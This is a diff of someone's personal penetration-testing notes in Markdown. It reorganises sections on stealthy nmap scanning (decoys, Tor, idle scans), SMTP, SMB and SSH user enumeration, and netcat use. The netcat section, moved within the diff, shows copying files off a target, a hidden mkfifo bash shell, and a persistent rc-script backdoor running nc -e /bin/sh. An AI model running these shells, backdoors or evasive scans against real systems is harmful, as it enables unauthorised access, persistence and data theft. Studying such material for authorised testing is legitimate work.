@@ -117,59 +117,6 @@
     site:.edu filetype:xls inurl:"email.xls"
     ```
 
-1. Enumeration by SMTP (Simple Mail Transfer Protocol, ports 25 or 587)
-   1. I can use metasploit and __auxiliary/scanner/smtp/smtp_version__ for checking.
-   1. If results are ok then use __auxiliary/scanner/smtp/smtp_enum__
-   1. After that I may also search executable program __smtp-user-enum.pl__
-   1. When I run it (__./smtp-user-enum.pl__) I get help options. Example usage are:
-
-    ```bash
-    ./smtp-user-enum.pl -M VRFY -U userList.txt -t 192.168.1.120
-    ```
-
-1. I can verify LDAP by using SMTP commands in telnet (require by ECC)
-
-    ```bash
-    telnet 192.168.1.12
-    (Verifying a User Name)
-        > S: VRFY Smith
-        R: 250 Fred Smith <Smith@USC-ISIF.ARPA> 
-        Or
-        > S: VRFY Jones
-        R: 550 String does not match anything.
-
-    (Expanding a Mailing List)
-        > S: EXPN Example-People
-        R: 250-Jon Postel <Postel@USC-ISIF.ARPA>
-        R: 250-Fred Fonebone <Fonebone@USC-ISIQ.ARPA>
-        R: 250-Sam Q. Smith <SQSmith@USC-ISIQ.ARPA>
-        R: 250-Quincy Smith <@USC-ISIF.ARPA:Q-Smith@ISI-VAXA.ARPA>
-        R: 250- <joe@foo-unix.ARPA>
-        R: 250 <xyz@bar-unix.ARPA>
-        Or
-        > S: EXPN Executive-Washroom-List
-        R: 550 Access Denied to You.
-
-    (Verify e-mail address of the recipient)
-        > S: EHLO
-        (or HELLO depends on a server)
-        > S: MAIL FROM: <you@server.com>
-        (address with the same domain as the server)
-        > S: RCPT TO: <friend@friendsdomain.com>  
-        (address to verify)
-        R: 250 OK – MAIL FROM <you@yourdomain.com>
-        OR
-        > S: EHLO
-        (or HELLO depends on a server)
-        > S: MAIL FROM: <you@server.com>
-        (address with the same domain as the server)
-        > S: RCPT TO: <friend@friendsdomain.com>  
-        (address to verify)
-        R: error
-        (the e-mail address you are trying to send a message to may be
-        blocked or it doesent`exist)
-    ```
-
 ### Theharvester
 
 1. The objective of this program is to gather emails, subdomains, hosts, employee names, open ports and banners from different public sources like search engines, PGP key servers and SHODAN computer database. A tool for gathering e-mail accounts and subdomain names from public sources.<br>This tool is intended to help Penetration Testers in the early stages of the penetration test in order to understand the customer footprint on the Internet. It is also useful for anyone that wants to know what an attacker can see about their organization.
@@ -303,97 +250,161 @@ Based on response from DNS server it identify if the host exist or not. Dnsrecon
     host -lv -t any domain
     ```
 
-## SCANNING
+## SCANNING METHODOLOGY
 
-### netcat command
+### CORE
 
-1. Connecting to a TCP/UDP Port
-1. Transferring Files with Netcat
-   1. Create a listener on my machine and pipe the traffic from the input into a file
+1. Scan via proxy.
+   1. Nmap-scan-through-tor (<https://www.aldeid.com/wiki/Tor/Usage/Nmap-scan-through-tor>)
+   1. Nmap decoys ip (quiet) with fragmentation scan that creates smaller packages reassemble in target (quiet).
+      1. decoys ip with fragmentation
 
-        ```bash
-        nc -lvvp 4444 > file_to_download.txt
-        
-        -l = listening
-        -vv = Show extra verbosity
-        -p = port for listening
-        ```
+            ```bash
+            nmap -f -D RND 192.168.1.110
 
-   1. Back on the ssh session on the target machine we are going to transfer the file through netcat to the listening port on our local machine
+            192.168.1.110 == target
+            ```
 
-        ```bash
-        nc -nvv 192.168.1.141 4444 < file_to_download.txt
-        
-        -n == do not resolve IP address using DNS
-        ```
+      1. generates a number of decoys and randomly puts the real source IP between them
 
-   1. netcat will not tell once the file has finished transferring. It is a good idea to open another shell and do __ls -ls fileToTransfer.csv.enc__ to check when the file has stopped increasing in size.
+            ```bash
+            nmap -D RND:10 192.168.1.110
+            
+            192.168.1.110 == target
+            ```
 
-1. Transfer a whole directory (including its content) from one host to another
-   1. On the sender side run first:
+1. Check for live systems.
+   1. Use ping command and its types (<https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol#Control_messages>)
+   1. Ping sweep
 
         ```bash
-        tar cfvz - folderToPass/ | nc -lp 10000
+        nmap -sn 192.168.1.0/24
         ```
 
-   1. Second. On the client side run:
+1. Check for open ports (nmap).
+   1. Open ports will respond with a SYN/ACK, and closed ports will respond with an RST.
 
         ```bash
-        nc [sender ip] 10000 | tar xfvz -
+        nmap -sT 192.168.1.0/24
         ```
 
-   1. No info will be printed. But I can check in Wireshark my connection. When I got [PSH, ACK] then
-  I can terminate sending file from sender machine
-
-1. Remote Administration with Netcat (Ubuntu Server 18.04)
-
-   1. I don't know how to automate it yet but i can create a reverse shell on a target machine.
-  Unfortunately netcat option __-e__ is discarded but with a Ubuntu Server 18.04 I can do something like this:
-
-   1. Server listning and provide a shell (I can use cron but it is veary obvious)
-
-        ```sh
-        #!/bin/sh
-        rm -f /tmp/.fdata && mkfifo /tmp/.fdata && cat /tmp/.fdata | /bin/bash -i 2>&1 | nc -l [host] [port] > /tmp/.fdata
-        ```
-
-   1. From attacking perspective
+   1. SYN Stealth Scan [-sS]
 
         ```bash
-        nc [host] [port]
+        nmap -sS 192.168.1.0/24
         ```
 
-   1. PS Old way working on linux was simple script run from __rc__ directory:
+   1. FIN and Null scans are less likely to show up in a logging system compered to -sS
 
-        ```sh
-        #!/bin/sh
-
-        #save in /etc/rc.d/rc.ftpp
-        mkdir -p /etc/ftp/.data
-        while true ; do
-        cd /etc/ftp/.data | nc -l -p 1337 -e /bin/sh
-        done
+        ```bash
+        nmap -sF 192.168.1.0/24
+        nmap -sN 192.168.1.0/24
         ```
 
-1. Scanning and Enumeration with Netcat (_Pasive banner grabbing_)
+   1. Discovering open ports on via netcat
 
-    ```bash
-    nc [host] 80 --> for system information
-    nc [host] 25 --> for mail information
-    ```
+       ```bash
+       nc -z -vv -w 1 192.168.1.100 20-25
 
-1. Discovering open ports on a machine
+       -z = Zero-I/O mode, report connection status only
+       -vv = Use more than once (-vv, -vvv...) for greater verbosity. With -v it will be verbose and display all kinds of useful connection based information
+       -w 1 = wait for 1 sec
+       20-25 = port range
+       ```
 
-    ```bash
-    nc -z -vv -w 1 192.168.1.100 20-25
+   1. Inverse TCP flag (If the port is open, there will be no response. If the port is closed, an RST/ACK will be sent in response.)
 
-    -z = Zero-I/O mode, report connection status only
-    -vv = Use more than once (-vv, -vvv...) for greater verbosity. With -v it will be verbose and display all kinds of useful connection based information
-    -w 1 = wait for 1 sec
-    20-25 = port range
-    ```
+        ```bash
+        nmap --scanflags FIN 192.168.1.0/24
+        nmap --scanflags URG 192.168.1.0/24
+        nmap --scanflags PSH 192.168.1.0/24
+        ```
 
-### tcpdump command
+   1. IDLE scan (zombi scan) uses a spoofed IP address (an idle zombie system) to elicit port responses during a scan. Designed for stealth, this scan uses a SYN flag and monitors responses as with a SYN scan.
+      1. Check if system can perform a scan
+
+            ```bash
+            nmap --script ipidseq 192.168.1.0-255
+            ```
+
+      1. Look for main zombi ip (Host script results == ipidseq: Incremental) and use it
+
+            ```bash
+            nmap -sI 192.168.1.100 -Pn 192.168.1.111
+
+            -sI == idle(zombi 192.168.1.100 from previous scan)
+            -Pn == no ping (target 192.168.1.111)
+            ```
+
+   1. ACK scan also as a safe alternative
+
+        ```bash
+        nmap -sA 192.168.1.0/24
+        ```
+
+1. Banner grabbing and OS fingerprinting will tell what operating system is on the machines.
+   1. Verifies operating system (aggressive, active)
+
+        ```bash
+        nmap -O 192.168.1.0/24
+        ```
+
+   2. Service verification (aggressive, active)
+
+        ```bash
+        nmap -sV 192.168.1.0/24
+        ```
+
+   3. Combined option -O and -sV + others nmap scripts (very aggressive, active)
+
+        ```bash
+        nmap -A 192.168.1.0/24
+        ```
+
+   4. Verifying operating system on the host (active)
+
+        ```bash
+        xprobe2 192.168.1.0
+        ```
+
+   5. Read response from telnet command (pasive)
+
+        ```bash
+        telnet 192.168.1.12 80 #(for system info)
+        telnet 192.168.1.12 25 #(form mail info)
+        ```
+
+   6. read response from netcat command (pasive)
+
+        ```bash
+        nc 192.168.1.12 80 #(for system info)
+        nc 192.168.1.12 25 #(form mail info)
+        ```
+
+1. Scan for vulnerabilities.
+   1. Check for potential flaws using a fuzzers like intruder in BurpSiut. Lists for payloads may came from different places. For example kali wordlists. But great place to start is <https://github.com/fuzzdb-project/fuzzdb>
+   1. Program to use:
+
+        ```bash
+        >   Openvas (free, Linux)
+        >   Retina, Nessus, CORE Impact, Nexpose (free, Windows/Linux)
+        >   SPARTA
+        ```
+
+   1. Look for:
+
+        ```bash
+        > Misconfiguration
+        > Default Installations 
+        > Buffer Overflows
+        > Missing Patches
+        > Design Flaws
+        > Operating System Flaws
+        > Application Flaws
+        > Default Passwords
+        ```
+
+### tcpdump SCANNING TOOL
 
 1. Tcpdump uses a small language called BPF to let me filter packets. When I run "sudo tcpdump port 53", "port 53" is a BPF filter.
 
@@ -559,7 +570,103 @@ Based on response from DNS server it identify if the host exist or not. Dnsrecon
     ssh root@remotesystem 'tcpdump -s0 -c 1000 -nn -w - not port 22' | wireshark -k -i -
     ```
 
-## BOB
+## ENUMERATION
+
+1. Enumeration by SMTP (Simple Mail Transfer Protocol, ports 25 or 587)
+   1. I can use metasploit and __auxiliary/scanner/smtp/smtp_version__ for checking (Always look at auxiliary/scanner/ for enumerators in metasploit).
+   1. If results are ok then use __auxiliary/scanner/smtp/smtp_enum__
+   1. After that I may also search executable program __smtp-user-enum.pl__
+   1. When I run it (__./smtp-user-enum.pl__) I get help options. Example usage are:
+
+        ```bash
+        ./smtp-user-enum.pl -M VRFY -U userList.txt -t 192.168.1.120
+        ```
+
+1. I can verify LDAP by using SMTP commands in telnet
+
+    ```bash
+    telnet 192.168.1.12
+    (Verifying a User Name)
+        > S: VRFY Smith
+        R: 250 Fred Smith <Smith@USC-ISIF.ARPA> 
+        Or
+        > S: VRFY Jones
+        R: 550 String does not match anything.
+
+    (Expanding a Mailing List)
+        > S: EXPN Example-People
+        R: 250-Jon Postel <Postel@USC-ISIF.ARPA>
+        R: 250-Fred Fonebone <Fonebone@USC-ISIQ.ARPA>
+        R: 250-Sam Q. Smith <SQSmith@USC-ISIQ.ARPA>
+        R: 250-Quincy Smith <@USC-ISIF.ARPA:Q-Smith@ISI-VAXA.ARPA>
+        R: 250- <joe@foo-unix.ARPA>
+        R: 250 <xyz@bar-unix.ARPA>
+        Or
+        > S: EXPN Executive-Washroom-List
+        R: 550 Access Denied to You.
+
+    (Verify e-mail address of the recipient)
+        > S: EHLO
+        (or HELLO depends on a server)
+        > S: MAIL FROM: <you@server.com>
+        (address with the same domain as the server)
+        > S: RCPT TO: <friend@friendsdomain.com>  
+        (address to verify)
+        R: 250 OK – MAIL FROM <you@yourdomain.com>
+        OR
+        > S: EHLO
+        (or HELLO depends on a server)
+        > S: MAIL FROM: <you@server.com>
+        (address with the same domain as the server)
+        > S: RCPT TO: <friend@friendsdomain.com>  
+        (address to verify)
+        R: error
+        (the e-mail address you are trying to send a message to may be
+        blocked or it doesent`exist)
+    ```
+
+1. Examples of the Linux enumeration commands are:
+   1. finger = provides information on the user and host machine,
+   1. rpcinfo and rpcclient = which provide information on RPC in the environment,
+   1. showmount (which displays all the shared directories on the machine).
+
+1. NetBios enumeration (ports 137 - 139, TCP or UDP)
+   1. SuperScan by MCAffe <https://sectools.org/tool/superscan/>
+   1. Winfingerprint = Win32 Host/Network Enumeration Scanner <https://packetstormsecurity.com/files/38356/winfingerprint-0.6.2.zip.html>
+   1. In my current Windows system, I can use the built-in utility nbtstat
+
+        ```ps
+        nbtstat                 #(for help)
+        nbtstat -n              #(for mine local table)
+        nbtstat -c              #(for the cache)
+        nbtstat -A IPADDRESS    #(for a remote system’s table)
+        ```
+
+1. Enumeration by DNS (port 53, UDP or TCP) and dnsrecon (A powerful DNS enumeration script, powerd by Kali)
+
+    ```bash
+    dnsrecon -d strona.org  #(for lookup)
+    dnsrecon -r 192.168.1.120-192.168.1.139 #(for reverse lookup)
+    dnsrecon -d strona.org -t zonewalk #(for zone walking) 
+    ```
+
+1. For enumeration by SMB (Server Message Block; for example cifs, port 25) I can use metasploit and __auxiliary/scanner/smb/smb_enumusers__
+
+1. Enumeration by SSH (Secure Shell, port 22) I can use metasploit and __auxiliary/scanner/ssh/ssh_enumusers__
+
+1. Web page written in wordpress enumeration
+
+```bash
+wpscan --url http://10.0.2.8/beckup-wordpres --enumerate p 
+ 
+p option is for plugins (more on that after wpscan -h) 
+PS. sometime is good idea to add wp_content_dir (more on that in wpscan -h) 
+```
+
+
+
+
+
 
 
 
@@ -628,6 +735,10 @@ Based on response from DNS server it identify if the host exist or not. Dnsrecon
 
 ## NOTES
 
+### SPARTA
+
+It is a python GUI application which simplifies network infrastructure penetration testing by aiding the penetration tester in the scanning and enumeration phases. This is a great tool that combines many different tools (also Nitko) not only for scanning and enumeration but also for hydra brute-force attack
+
 ### PORT TO REMEMBER
 
 |  Set One      | Set Two              |
@@ -652,6 +763,76 @@ Based on response from DNS server it identify if the host exist or not. Dnsrecon
 |---|---|
 |sipcalc 172.16.0.0/12|    for checking a network|
 |sipcalc 172.16.0.0/12 -s 16|  for devide network on 16 subnets; -s > /12 on that example|
+
+### NETCAT FILE TRANSFER AND REMOTE ADMINISTRATION
+
+1. Connecting to a TCP/UDP Port
+1. Transferring Files with Netcat
+   1. Create a listener on my machine and pipe the traffic from the input into a file
+
+        ```bash
+        nc -lvvp 4444 > file_to_download.txt
+        
+        -l = listening
+        -vv = Show extra verbosity
+        -p = port for listening
+        ```
+
+   1. Back on the ssh session on the target machine we are going to transfer the file through netcat to the listening port on our local machine
+
+        ```bash
+        nc -nvv 192.168.1.141 4444 < file_to_download.txt
+        
+        -n == do not resolve IP address using DNS
+        ```
+
+   1. netcat will not tell once the file has finished transferring. It is a good idea to open another shell and do __ls -ls fileToTransfer.csv.enc__ to check when the file has stopped increasing in size.
+
+1. Transfer a whole directory (including its content) from one host to another
+   1. On the sender side run first:
+
+        ```bash
+        tar cfvz - folderToPass/ | nc -lp 10000
+        ```
+
+   1. Second. On the client side run:
+
+        ```bash
+        nc [sender ip] 10000 | tar xfvz -
+        ```
+
+   1. No info will be printed. But I can check in Wireshark my connection. When I got [PSH, ACK] then
+  I can terminate sending file from sender machine
+
+1. Remote Administration with Netcat (Ubuntu Server 18.04)
+
+   1. I don't know how to automate it yet but i can create a reverse shell on a target machine.
+  Unfortunately netcat option __-e__ is discarded but with a Ubuntu Server 18.04 I can do something like this:
+
+   1. Server listning and provide a shell (I can use cron but it is veary obvious)
+
+        ```sh
+        #!/bin/sh
+        rm -f /tmp/.fdata && mkfifo /tmp/.fdata && cat /tmp/.fdata | /bin/bash -i 2>&1 | nc -l [host] [port] > /tmp/.fdata
+        ```
+
+   1. From attacking perspective
+
+        ```bash
+        nc [host] [port]
+        ```
+
+   1. PS Old way working on linux was simple script run from __rc__ directory:
+
+        ```sh
+        #!/bin/sh
+
+        #save in /etc/rc.d/rc.ftpp
+        mkdir -p /etc/ftp/.data
+        while true ; do
+        cd /etc/ftp/.data | nc -l -p 1337 -e /bin/sh
+        done
+        ```
 
 ### DHCP ISSUES
 
